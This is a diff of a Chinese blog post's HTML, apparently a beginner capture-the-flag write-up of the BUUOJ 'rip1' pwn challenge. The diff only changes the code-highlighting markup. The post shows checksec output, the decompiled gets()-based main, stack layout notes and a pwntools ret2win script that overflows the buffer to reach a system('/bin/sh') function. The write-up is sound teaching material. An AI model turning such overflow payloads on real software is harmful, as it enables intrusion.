@@ -21,12 +21,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.18.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":10,"offset":5},"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/config.min.js"></script>
 
-    <meta name="description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 checksec --file&#x3D;.&#x2F;pwn1 RELRO: Partial RELRO STACK CANARY: No canary found #没有cannary NX: NX disabled   #栈可执行          PIE:">
+    <meta name="description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 1234567891011checksec --file&#x3D;.&#x2F;pwn1RELRO: Partial RELROSTACK CANARY: No canary found #没有cannaryNX: NX disabled   #栈可执行">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn初体验">
 <meta property="og:url" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/index.html">
 <meta property="og:site_name" content="Oh, Tony">
-<meta property="og:description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 checksec --file&#x3D;.&#x2F;pwn1 RELRO: Partial RELRO STACK CANARY: No canary found #没有cannary NX: NX disabled   #栈可执行          PIE:">
+<meta property="og:description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 1234567891011checksec --file&#x3D;.&#x2F;pwn1RELRO: Partial RELROSTACK CANARY: No canary found #没有cannaryNX: NX disabled   #栈可执行">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/stack.jpg">
 <meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213638630.png">
@@ -272,17 +272,7 @@
     <div class="post-body" itemprop="articleBody"><h2 id="从一道入门题目开始">从一道入门题目开始</h2>
 <p>题目来源:https://buuoj.cn/challenges，Pwn目录下的<code>rip1</code>，下载附件<code>pwn1</code>。</p>
 <h3 id="查看pwn1的安全设置">查看pwn1的安全设置</h3>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>./pwn1
-RELRO: Partial RELRO
-STACK CANARY: No canary found <span class="token comment">#没有cannary</span>
-NX: NX disabled   <span class="token comment">#栈可执行         </span>
-PIE: No PIE	<span class="token comment">#未开启代码段随机化(程序被加载进了固定的地址中)</span>
-RPATH: No RPATH 
-RUNPATH:  No RUNPATH
-Symbols: <span class="token number">64</span> Symbols 		
-FORTIFY	Fortified: No	
-Fortifiable: <span class="token number">0</span>
-FILE: ./pwn1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=./pwn1</span><br><span class="line">RELRO: Partial RELRO</span><br><span class="line">STACK CANARY: No canary found #没有cannary</span><br><span class="line">NX: NX disabled   #栈可执行         </span><br><span class="line">PIE: No PIE	#未开启代码段随机化(程序被加载进了固定的地址中)</span><br><span class="line">RPATH: No RPATH </span><br><span class="line">RUNPATH:  No RUNPATH</span><br><span class="line">Symbols: 64 Symbols 		</span><br><span class="line">FORTIFY	Fortified: No	</span><br><span class="line">Fortifiable: 0</span><br><span class="line">FILE: ./pwn1</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 <p>介绍一些常用的安全选项:</p>
 <ul>
@@ -291,65 +281,12 @@ FILE: ./pwn1<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <li>STACK CANARY:是否使用栈保护。若开启栈保护，则会验证cannary中存的数据是否相同，若不相同则发生了栈溢出。</li>
 </ul>
 <h3 id="使用ida反编译">使用ida反编译</h3>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
-&#123;
-  char s[15]; &#x2F;&#x2F; [rsp+1h] [rbp-Fh] BYREF
-
-  puts(&quot;please input&quot;);
-  gets(s, argv);
-  puts(s);
-  puts(&quot;ok,bye!!!&quot;);
-  return 0;
-&#125;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>发现该文件使用了极其不安全的gets()函数。因为gets()不会判断输入的长度，容易造成栈溢出漏洞。继续浏览函数列表，发现有一个函数<code>fun</code></p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int fun()
-&#123;
-  return system(&quot;&#x2F;bin&#x2F;sh&quot;);
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>因此可以使用栈溢出调用system函数从而获得shell。</p>
 <p>贴一下两个函数的汇编</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.text:0000000000401142 ; int __cdecl main(int argc, const char **argv, const char **envp)
-.text:0000000000401142                 public main
-.text:0000000000401142 main            proc near               ; DATA XREF: _start+1D↑o
-.text:0000000000401142
-.text:0000000000401142 s               &#x3D; byte ptr -0Fh
-.text:0000000000401142
-.text:0000000000401142 ; __unwind &#123;
-.text:0000000000401142                 push    rbp
-.text:0000000000401143                 mov     rbp, rsp
-.text:0000000000401146                 sub     rsp, 10h
-.text:000000000040114A                 lea     rdi, s          ; &quot;please input&quot;
-.text:0000000000401151                 call    _puts
-.text:0000000000401156                 lea     rax, [rbp+s]
-.text:000000000040115A                 mov     rdi, rax
-.text:000000000040115D                 mov     eax, 0
-.text:0000000000401162                 call    _gets
-.text:0000000000401167                 lea     rax, [rbp+s]
-.text:000000000040116B                 mov     rdi, rax        ; s
-.text:000000000040116E                 call    _puts
-.text:0000000000401173                 lea     rdi, aOkBye     ; &quot;ok,bye!!!&quot;
-.text:000000000040117A                 call    _puts
-.text:000000000040117F                 mov     eax, 0
-.text:0000000000401184                 leave
-.text:0000000000401185                 retn
-.text:0000000000401185 ; &#125; &#x2F;&#x2F; starts at 401142
-.text:0000000000401185 main            endp
-.text:0000000000401186 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-.text:0000000000401186 
-.text:0000000000401186
-.text:0000000000401186                 public fun
-.text:0000000000401186 fun             proc near
-.text:0000000000401186 ; __unwind &#123;
-.text:0000000000401186                 push    rbp
-.text:0000000000401187                 mov     rbp, rsp
-.text:000000000040118A                 lea     rdi, command    ; &quot;&#x2F;bin&#x2F;sh&quot;
-.text:0000000000401191                 call    _system 
-.text:0000000000401196                 nop
-.text:0000000000401197                 pop     rbp
-.text:0000000000401198                 retn
-.text:0000000000401198 ; &#125; &#x2F;&#x2F; starts at 401186
-.text:0000000000401198 fun             endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401142</span> ; <span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401142</span>                 public main</span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401142</span> main            proc near               ;</span> DATA XREF: _start+<span class="number">1</span>D↑o</span><br><span class="line">.text:<span class="number">0000000000401142</span></span><br><span class="line">.text:<span class="number">0000000000401142</span> s               = byte ptr <span class="number">-0F</span>h</span><br><span class="line">.text:<span class="number">0000000000401142</span></span><br><span class="line">.text:<span class="number">0000000000401142</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401142</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401143</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000000040114</span>A                 lea     rdi, s          ; <span class="string">&quot;please input&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401151</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0000000000401156</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040115</span>A                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">000000000040115</span>D                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401162</span>                 call    _gets</span><br><span class="line">.text:<span class="number">0000000000401167</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040116B</span>                 mov     rdi, rax        ; s</span><br><span class="line">.text:<span class="number">000000000040116</span>E                 call    _puts</span><br><span class="line">.text:<span class="number">0000000000401173</span>                 lea     rdi, aOkBye     ; <span class="string">&quot;ok,bye!!!&quot;</span></span><br><span class="line">.text:<span class="number">000000000040117</span>A                 call    _puts</span><br><span class="line">.text:<span class="number">000000000040117F</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401184</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000401185</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401185</span> ; &#125; <span class="comment">// starts at 401142</span></span><br><span class="line">.text:<span class="number">0000000000401185</span> main            endp</span><br><span class="line">.text:<span class="number">0000000000401186</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000401186</span> </span><br><span class="line">.text:<span class="number">0000000000401186</span></span><br><span class="line">.text:<span class="number">0000000000401186</span>                 <span class="keyword">public</span> fun</span><br><span class="line">.text:<span class="number">0000000000401186</span> fun             proc near</span><br><span class="line">.text:<span class="number">0000000000401186</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401186</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401187</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040118</span>A                 lea     rdi, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401191</span>                 call    _system </span><br><span class="line">.text:<span class="number">0000000000401196</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401197</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401198</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401198</span> ; &#125; <span class="comment">// starts at 401186</span></span><br><span class="line">.text:<span class="number">0000000000401198</span> fun             endp</span><br></pre></td></tr></table></figure>
 <h3 id="栈溢出思路">栈溢出思路</h3>
 <ol type="1">
 <li>找到输入数据存在栈中的buffer的地址</li>
@@ -364,59 +301,17 @@ FILE: ./pwn1<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 </ol>
 <h3 id="栈的开辟">栈的开辟</h3>
 <p>x64和ARM很类似，x64中入栈和出栈的指令以及其分解：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//入栈</span>
-call <span class="token operator">&lt;</span>标号<span class="token operator">></span> <span class="token comment">//这个指令是先将call+标号的下一条语句的IP放入栈中，然后使当前的IP进行位移。 (类似ARM中的LR寄存器压栈和b跳转指令)</span>
-push ebp<span class="token operator">/</span>rbp <span class="token comment">//通过sp将寄存器中数据入栈，每压入一个值sp就向低地址移动一个单位。(此bp类似ARM中的R11)。可拆成如下两个指令</span>
-    		<span class="token comment">//sub rsp #8</span>
-    		<span class="token comment">//mov rbp [rsp]</span>
-mov esp<span class="token operator">/</span>rsp	<span class="token comment">//将当前sp的数据指向新栈的栈顶</span>
-sub esp<span class="token operator">/</span>rsp #num <span class="token comment">//使用sp向低地址开辟num大小的空间</span>
-    
-<span class="token comment">//出栈</span>
-leave <span class="token comment">//从栈中恢复ebp，该指令可以拆分成如下两个</span>
-      <span class="token comment">//mov esp ebp //回收esp</span>
-      <span class="token comment">//add rsp #8	//对ebp赋值,pop也可拆解为如下两个指令：</span>
-    				<span class="token comment">//</span>
-    	
-retn <span class="token comment">//恢复IP寄存器，可以理解为pop IP，与call指令对应</span>
-     <span class="token comment">//pop ip可拆为</span>
-     <span class="token comment">//mov ip (rsp)</span>
-     <span class="token comment">//add rsp #8</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入栈</span></span><br><span class="line">call &lt;标号&gt; <span class="comment">//这个指令是先将call+标号的下一条语句的IP放入栈中，然后使当前的IP进行位移。 (类似ARM中的LR寄存器压栈和b跳转指令)</span></span><br><span class="line">push ebp/rbp <span class="comment">//通过sp将寄存器中数据入栈，每压入一个值sp就向低地址移动一个单位。(此bp类似ARM中的R11)。可拆成如下两个指令</span></span><br><span class="line">    		<span class="comment">//sub rsp #8</span></span><br><span class="line">    		<span class="comment">//mov rbp [rsp]</span></span><br><span class="line">mov esp/rsp	<span class="comment">//将当前sp的数据指向新栈的栈顶</span></span><br><span class="line">sub esp/rsp <span class="meta">#num <span class="comment">//使用sp向低地址开辟num大小的空间</span></span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line">leave <span class="comment">//从栈中恢复ebp，该指令可以拆分成如下两个</span></span><br><span class="line">      <span class="comment">//mov esp ebp //回收esp</span></span><br><span class="line">      <span class="comment">//add rsp #8	//对ebp赋值,pop也可拆解为如下两个指令：</span></span><br><span class="line">    				<span class="comment">//</span></span><br><span class="line">    	</span><br><span class="line">retn <span class="comment">//恢复IP寄存器，可以理解为pop IP，与call指令对应</span></span><br><span class="line">     <span class="comment">//pop ip可拆为</span></span><br><span class="line">     <span class="comment">//mov ip (rsp)</span></span><br><span class="line">     <span class="comment">//add rsp #8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>栈中数据排布大致如下:</p>
 <p><img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/stack.jpg"></p>
 <h3 id="具体实现">具体实现</h3>
 <p>puts函数的缓冲区是s，s距离rbp寄存器相隔<code>0xF</code>，相当于距离栈顶相隔<code>0xF</code>。由于是64位的elf文件，则s距离栈中rbp的距离为<code>0xF+0x8</code>，距离main函数的返回地址长度是`<code>0xF+0x8+0x8</code>。然后我们只需要将最后的地址设置为fun函数的地址即可。</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.text:0000000000401142 s               &#x3D; byte ptr -0Fh
-...
-.text:0000000000401167                 lea     rax, [rbp+s]
-.text:000000000040116B                 mov     rdi, rax        ; s
-.text:000000000040116E                 call    _puts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401142</span> s               = byte ptr <span class="number">-0F</span>h</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">0000000000401167</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040116B</span>                 mov     rdi, rax        ; s</span><br><span class="line">.text:<span class="number">000000000040116</span>E                 call    _puts</span><br></pre></td></tr></table></figure>
 <p>由于在main函数执行<code>leave</code>指令的时候必须要给rbp赋值，并且在ubuntu18上面调用system()函数需要进行栈对齐，因此我们需要一个跳板，将rbp指向栈的顶端(页的整数倍的地址)，然后再跳转到fun函数，于是我们首先跳转到fun的retn中，然后再使用retn指令帮我们跳转到fun函数。使用pwntool构造payload并实施栈溢出</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment"># p = remote('node3.buuoj.cn',29175)</span>
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span>
-retn <span class="token operator">=</span> <span class="token number">0x401198</span><span class="token comment">#fun的retn地址</span>
-<span class="token comment">#rand = 0x401091</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>retn<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span><span class="token comment">#0x401186为fun的起始地址</span>
-<span class="token comment">#pause()</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29175)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.pid)</span><br><span class="line">retn = <span class="number">0x401198</span><span class="comment">#fun的retn地址</span></span><br><span class="line"><span class="comment">#rand = 0x401091</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">0x8</span>)+p64(retn)+p64(<span class="number">0x401186</span>)<span class="comment">#0x401186为fun的起始地址</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="栈环境验证">栈环境验证</h3>
 <p>修改代码，让程序能够暂停好让我们使用gdb attach过去。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment"># p = remote('node3.buuoj.cn',29175)</span>
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span>
-pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
-retn <span class="token operator">=</span> <span class="token number">0x401198</span><span class="token comment">#fun的retn地址</span>
-<span class="token comment">#rand = 0x401091</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>retn<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span><span class="token comment">#0x401186为fun的起始地址</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29175)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.pid)</span><br><span class="line">pause()</span><br><span class="line">retn = <span class="number">0x401198</span><span class="comment">#fun的retn地址</span></span><br><span class="line"><span class="comment">#rand = 0x401091</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">0x8</span>)+p64(retn)+p64(<span class="number">0x401186</span>)<span class="comment">#0x401186为fun的起始地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>在gdb中在main函数中leave指令处加断点，如下:</p>
 <figure>
 <img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213638630.png" alt><figcaption>image-20210508213638630</figcaption>
